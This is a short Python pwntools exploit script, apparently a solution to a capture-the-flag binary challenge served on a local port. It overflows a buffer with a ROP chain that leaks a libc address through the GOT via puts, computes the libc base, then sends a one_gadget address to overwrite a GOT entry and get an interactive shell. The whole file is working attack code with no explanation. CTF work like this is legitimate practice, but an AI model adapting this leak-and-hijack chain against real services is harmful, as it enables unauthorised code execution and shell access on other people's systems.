from pwn import *

# p = process(["../src/chall"])
p = remote("127.0.0.1",32782)
elf = ELF("../dist/chall")
libc = ELF("../dist/libc.so.6")

# context.log_level = 'debug'

pop_rdi = 0x00000000004012f3
call_puts = 0x0000000000401238

payload = b"\x00"*32
payload += p64(elf.got['strlen']+0x20) # rbp = got to overwrite
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(call_puts)

# gdb.attach(p,"""
# init-pwndbg
# br *0x0000000000401283
# """)

p.sendlineafter("!\n",payload)

leak_libc = u64(p.recv(6).ljust(8,b"\x00"))
libc.address = leak_libc - (libc.symbols["puts"])

log.info("Leak libc     : " + hex(leak_libc))
log.info("Leak libc base: " + hex(libc.address))

one_gadget = p64(libc.address + 0xe3b01)

p.sendline(one_gadget)

p.interactive()
